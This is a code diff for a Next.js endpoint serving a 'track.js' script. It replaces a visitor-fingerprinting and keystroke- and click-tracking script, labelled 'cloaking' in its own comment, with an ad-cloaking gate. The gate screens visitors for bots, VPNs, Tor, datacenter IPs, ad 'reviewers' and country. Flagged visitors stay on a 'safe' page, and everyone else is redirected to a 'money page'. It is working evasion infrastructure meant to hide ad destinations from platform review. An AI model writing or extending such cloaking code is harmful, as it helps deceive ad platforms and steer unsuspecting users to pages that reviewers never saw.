@@ -1,253 +1,182 @@
-import { type NextRequest, NextResponse } from "next/server"
+import { type NextRequest } from "next/server"
+import { supabaseAdmin, isSupabaseConfigured } from "@/lib/supabase"
+import { detectAdvancedBot } from "@/lib/advanced-bot-detection"
+import { isDatacenterOrProxy, detectProxyHeaders } from "@/lib/datacenter-detection"
+import { getIPReputation, markIPBlocked, markIPClean, isRepeatOffender } from "@/lib/ip-reputation"
+
+// Returns JS that does nothing — visitor stays on page
+function safeJs(): string {
+  return "(function(){})();"
+}
+
+// Returns JS that redirects to money page
+function redirectJs(url: string): string {
+  const u = JSON.stringify(normalizeUrl(url))
+  return `(function(u){try{window.location.replace(u);}catch(e){window.location.href=u;}})(${u});`
+}
+
+// Without a protocol, browsers treat "google.com" as a path on the
+// current domain (e.g. limbun.online/google.com) instead of redirecting away
+function normalizeUrl(url: string): string {
+  const trimmed = url.trim()
+  return /^https?:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`
+}
+
+const JS_HEADERS = {
+  "Content-Type": "application/javascript; charset=UTF-8",
+  "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+  "Access-Control-Allow-Origin": "*",
+}
 
 export async function GET(request: NextRequest) {
-  const { searchParams } = new URL(request.url)
-  const websiteId = searchParams.get("id") || "default"
+  try {
+    const { searchParams } = new URL(request.url)
+    const campaignCode = (searchParams.get("c") || "").trim()
 
-  // Get the current domain dynamically
-  const host = request.headers.get("host") || "localhost:3000"
-  const protocol = request.headers.get("x-forwarded-proto") || "http"
-  const metricsEndpoint = `${protocol}://${host}/api/track-visit`
-
-  // Advanced cloaking JavaScript with automatic endpoint detection
-  const trackingScript = `
-(function() {
-  'use strict';
-  
-  // Configuration with dynamic endpoint
-  const config = {
-    websiteId: '${websiteId}',
-    metricsEndpoint: '${metricsEndpoint}',
-    debug: false
-  };
-
-  // Visitor classification system
-  const VisitorAnalytics = {
-    // Collect comprehensive visitor data
-    collectVisitorData: function() {
-      const data = {
-        // Browser characteristics
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(',') : '',
-        platform: navigator.platform,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        
-        // Screen and display
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        screenColorDepth: screen.colorDepth,
-        screenPixelDepth: screen.pixelDepth,
-        windowWidth: window.innerWidth,
-        windowHeight: window.innerHeight,
-        
-        // Timezone and location
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        
-        // Performance and capabilities
-        hardwareConcurrency: navigator.hardwareConcurrency || 0,
-        deviceMemory: navigator.deviceMemory || 0,
-        connection: navigator.connection ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt
-        } : null,
-        
-        // Page information
-        url: window.location.href,
-        referrer: document.referrer,
-        title: document.title,
-        
-        // Session data
-        sessionId: this.generateSessionId(),
-        timestamp: Date.now(),
-        loadTime: performance.now()
-      };
-      
-      return data;
-    },
-    
-    // Generate unique session identifier
-    generateSessionId: function() {
-      return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-    },
-    
-    // Behavioral analysis
-    analyzeBehavior: function() {
-      const behavior = {
-        mouseMovements: 0,
-        clicks: 0,
-        scrolls: 0,
-        keystrokes: 0,
-        focusChanges: 0,
-        timeOnPage: 0,
-        interactions: []
-      };
-      
-      // Track mouse movements
-      let mouseTimer;
-      document.addEventListener('mousemove', function() {
-        behavior.mouseMovements++;
-        clearTimeout(mouseTimer);
-        mouseTimer = setTimeout(() => {
-          behavior.interactions.push({type: 'mouse', time: Date.now()});
-        }, 100);
-      });
-      
-      // Track clicks
-      document.addEventListener('click', function(e) {
-        behavior.clicks++;
-        behavior.interactions.push({
-          type: 'click', 
-          time: Date.now(),
-          x: e.clientX,
-          y: e.clientY,
-          target: e.target.tagName
-        });
-      });
-      
-      // Track scrolling
-      let scrollTimer;
-      window.addEventListener('scroll', function() {
-        behavior.scrolls++;
-        clearTimeout(scrollTimer);
-        scrollTimer = setTimeout(() => {
-          behavior.interactions.push({
-            type: 'scroll', 
-            time: Date.now(),
-            scrollY: window.scrollY
-          });
-        }, 100);
-      });
-      
-      // Track keyboard input
-      document.addEventListener('keydown', function() {
-        behavior.keystrokes++;
-        behavior.interactions.push({type: 'keystroke', time: Date.now()});
-      });
-      
-      // Track focus changes
-      window.addEventListener('focus', function() {
-        behavior.focusChanges++;
-        behavior.interactions.push({type: 'focus', time: Date.now()});
-      });
-      
-      window.addEventListener('blur', function() {
-        behavior.focusChanges++;
-        behavior.interactions.push({type: 'blur', time: Date.now()});
-      });
-      
-      return behavior;
-    },
-    
-    // Send data to server
-    transmitData: function(data) {
-      // Use multiple transmission methods for reliability
-      const payload = JSON.stringify(data);
-      
-      // Method 1: Fetch API (preferred)
-      if (typeof fetch !== 'undefined') {
-        fetch(config.metricsEndpoint, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Requested-With': 'XMLHttpRequest'
-          },
-          body: payload,
-          keepalive: true
-        }).catch(() => {
-          // Fallback to beacon if fetch fails
-          this.sendBeacon(data);
-        });
-      } else {
-        // Method 2: XMLHttpRequest fallback
-        this.sendXHR(data);
-      }
-    },
-    
-    // Beacon API fallback
-    sendBeacon: function(data) {
-      if (navigator.sendBeacon) {
-        const formData = new FormData();
-        formData.append('data', JSON.stringify(data));
-        navigator.sendBeacon(config.metricsEndpoint, formData);
-      }
-    },
-    
-    // XMLHttpRequest fallback
-    sendXHR: function(data) {
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', config.metricsEndpoint, true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(JSON.stringify(data));
+    if (!campaignCode) {
+      return new Response(safeJs(), { headers: JS_HEADERS })
     }
-  };
-  
-  // Initialize tracking
-  function initializeTracking() {
-    const visitorData = VisitorAnalytics.collectVisitorData();
-    const behaviorData = VisitorAnalytics.analyzeBehavior();
-    
-    // Combine all data
-    const trackingData = {
-      websiteId: config.websiteId,
-      visitor: visitorData,
-      behavior: behaviorData,
-      pageShown: window.location.pathname.includes('/safe') ? 'safe' : 'landing'
-    };
-    
-    // Send initial data
-    VisitorAnalytics.transmitData(trackingData);
-    
-    // Send periodic updates
-    setInterval(function() {
-      const updatedData = {
-        ...trackingData,
-        behavior: {
-          ...behaviorData,
-          timeOnPage: Date.now() - visitorData.timestamp
-        },
-        timestamp: Date.now()
-      };
-      VisitorAnalytics.transmitData(updatedData);
-    }, 30000); // Every 30 seconds
-    
-    // Send data on page unload
-    window.addEventListener('beforeunload', function() {
-      const finalData = {
-        ...trackingData,
-        behavior: {
-          ...behaviorData,
-          timeOnPage: Date.now() - visitorData.timestamp
-        },
-        event: 'page_unload'
-      };
-      VisitorAnalytics.sendBeacon(finalData);
-    });
-  }
-  
-  // Start tracking when DOM is ready
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initializeTracking);
-  } else {
-    initializeTracking();
-  }
-  
-  // Debug logging
-  if (config.debug) {
-    console.log('Advanced visitor tracking initialized');
-    console.log('Metrics endpoint:', config.metricsEndpoint);
-  }
-})();
-`
 
-  return new NextResponse(trackingScript, {
-    headers: {
-      "Content-Type": "application/javascript",
-      "Cache-Control": "public, max-age=3600",
-      "Access-Control-Allow-Origin": "*",
-    },
-  })
+    // ── Extract visitor info from request headers ─────────────
+    const rawXFF = request.headers.get("x-forwarded-for") || ""
+    const ip =
+      request.headers.get("cf-connecting-ip") ||
+      request.headers.get("x-real-ip")        ||
+      rawXFF.split(",")[0]?.trim()             ||
+      "127.0.0.1"
+
+    const userAgent = request.headers.get("user-agent") || ""
+    const referer   = request.headers.get("referer")    || ""
+    const country   =
+      request.headers.get("x-vercel-ip-country") ||
+      request.headers.get("cf-ipcountry")        ||
+      "UNKNOWN"
+
+    const headers: Record<string, string | null> = {
+      "accept":           request.headers.get("accept"),
+      "accept-language":  request.headers.get("accept-language"),
+      "accept-encoding":  request.headers.get("accept-encoding"),
+      "connection":       request.headers.get("connection"),
+      "sec-fetch-site":   request.headers.get("sec-fetch-site"),
+      "sec-fetch-mode":   request.headers.get("sec-fetch-mode"),
+      "via":              request.headers.get("via"),
+      "proxy-connection": request.headers.get("proxy-connection"),
+      "x-forwarded-for":  rawXFF || null,
+      "x-real-ip":        request.headers.get("x-real-ip"),
+    }
+
+    // ── Load campaign by code ─────────────────────────────────
+    let website: any = null
+    if (isSupabaseConfigured()) {
+      const { data } = await supabaseAdmin
+        .from("websites")
+        .select("*")
+        .eq("campaign_code", campaignCode)
+        .single()
+      website = data
+    }
+
+    if (!website || !website.cloaking_enabled || !website.is_active) {
+      return new Response(safeJs(), { headers: JS_HEADERS })
+    }
+
+    const selectedPlatforms: string[] = Array.isArray(website.blocked_ad_platforms)
+      ? website.blocked_ad_platforms : []
+
+    // ── Detection pipeline ────────────────────────────────────
+    let blocked = false
+    let reason   = "qualified_human"
+    let category = ""
+
+    const block = (r: string, cat: string) => { blocked = true; reason = r; category = cat }
+
+    // Guard 1: Repeat offender
+    if (isRepeatOffender(ip)) {
+      block("repeat_offender", "repeat")
+
+    // Guard 2: IP reputation cache
+    } else {
+      const cached = getIPReputation(ip)
+      if (cached?.blocked) {
+        block(cached.reason, cached.category)
+      } else {
+        // Guard 3: Proxy headers
+        const proxyCheck = detectProxyHeaders(headers)
+        if (proxyCheck.isProxy) {
+          markIPBlocked(ip, "proxy_headers", "proxy")
+          block("proxy_headers_detected", "proxy")
+        }
+
+        // Guard 4: Bot detection
+        if (!blocked) {
+          const botResult = detectAdvancedBot(userAgent, headers, ip)
+          if (botResult.isBot) {
+            markIPBlocked(ip, `bot:${botResult.botType || "unknown"}`, "bot")
+            block(`bot:${botResult.botType || "unknown"}`, "bot")
+          }
+        }
+
+        // Guard 5: Datacenter / VPN / TOR / Reviewer
+        if (!blocked) {
+          const dcResult = await isDatacenterOrProxy(ip)
+          if (dcResult.blocked) {
+            const cat = dcResult.analysis.isTor           ? "tor"
+                      : dcResult.analysis.isHumanReviewer ? "reviewer"
+                      : dcResult.analysis.isVPN           ? "vpn"
+                      : dcResult.analysis.isProxy         ? "proxy"
+                      : "datacenter"
+            markIPBlocked(ip, dcResult.reason, cat as any)
+            block(dcResult.reason, cat)
+          }
+        }
+
+        // Guard 6: Country filter
+        if (!blocked) {
+          const allowed = Array.isArray(website.allowed_countries) ? website.allowed_countries : []
+          if (allowed.length > 0 && country !== "UNKNOWN" && !allowed.includes(country)) {
+            block("blocked_country", "geo")
+          }
+        }
+
+        if (!blocked) markIPClean(ip)
+      }
+    }
+
+    // ── Log to DB ─────────────────────────────────────────────
+    if (isSupabaseConfigured()) {
+      supabaseAdmin.from("access_logs").insert([{
+        website_id:   website.id,
+        ip_address:   ip,
+        country,
+        user_agent:   userAgent,
+        page_shown:   blocked ? "safe" : "money",
+        is_bot:       blocked,
+        bot_type:     category || null,
+        bot_confidence: null,
+        action_taken: blocked ? "stay_on_safe" : "redirect_money",
+        reason,
+        referrer:     referer || null,
+        pathname:     referer || "/",
+        ad_platform:  null,
+        created_at:   new Date().toISOString(),
+      }]).then(({ error }: { error: unknown }) => {
+        if (error) console.error("track.js log:", error)
+      })
+    }
+
+    const tag = blocked
+      ? (category === "bot" ? "🤖" : category === "vpn" ? "🔒" : category === "reviewer" ? "👁️" : "🚫")
+      : "✅"
+    console.log(`[track.js] ${tag} | ${country} | ${reason} | ${ip}`)
+
+    if (blocked) {
+      return new Response(safeJs(), { headers: JS_HEADERS })
+    }
+
+    return new Response(redirectJs(website.landing_page_url), { headers: JS_HEADERS })
+
+  } catch (err) {
+    console.error("track.js error:", err)
+    return new Response(safeJs(), { headers: JS_HEADERS })
+  }
 }
